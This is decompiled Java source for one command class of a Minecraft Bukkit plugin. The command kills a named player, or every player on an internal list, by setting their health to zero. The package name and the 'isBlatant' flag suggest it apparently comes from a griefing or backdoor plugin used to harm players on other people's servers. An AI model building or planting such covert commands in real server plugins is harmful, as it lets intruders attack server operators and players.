/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 *  org.bukkit.plugin.Plugin
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

/*
 * Illegal identifiers - consider using --renameillegalidents true
 */
public class KillCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (args.length <= 1) {
            p2.sendMessage(Settings.USAGE("kill <player>"));
        } else if (args[1].equals("*")) {
            for (Player a2 : Bukkit.getOnlinePlayers()) {
                if (!plugin.lite.contains(a2.getName())) continue;
                plugin.getServer().getScheduler().runTaskAsynchronously((Plugin)plugin, () -> a2.setHealth(0.0));
            }
            p2.sendMessage(Settings.PREFIX("Everyone not logged in was killed!"));
        } else {
            Player target = Bukkit.getServer().getPlayer(args[1]);
            if (target == null) {
                p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + args[1] + Settings.WHITE + " is not online."));
            } else {
                plugin.getServer().getScheduler().runTaskAsynchronously((Plugin)plugin, () -> target.setHealth(0.0));
                p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + target.getName() + Settings.WHITE + " was killed"));
            }
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }


}

